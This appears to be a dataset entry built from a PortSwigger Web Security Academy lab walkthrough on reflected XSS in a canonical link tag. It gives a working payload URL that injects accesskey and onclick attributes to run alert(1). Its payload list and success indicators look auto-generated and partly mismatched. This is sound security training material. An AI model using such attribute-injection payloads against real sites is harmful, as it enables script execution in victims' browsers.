## Reflected XSS in canonical link tag

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
This lab reflects user input in a canonical link tag and escapes angle brackets.

### Solution Steps
1. Visit the following URL, replacing YOUR-LAB-ID with your lab ID: https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called.
2. To trigger the exploit on yourself, press one of the following key combinations: On Windows: ALT+SHIFT+X On MacOS: CTRL+ALT+X On Linux: Alt+X

### Key Payloads
- `alert`
- `ALT+SHIFT+X`
- `CTRL+ALT+X`
- `Alt+X`
- `YOUR-LAB-ID`
- `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`

### Indicators of Success
- Payload reflected in response without encoding
- `<script>` tags rendered as HTML elements
- JavaScript alert/print executes in browser
- DOM shows injected elements
- No WAF block or sanitization
---
*Source: PortSwigger Web Security Academy*
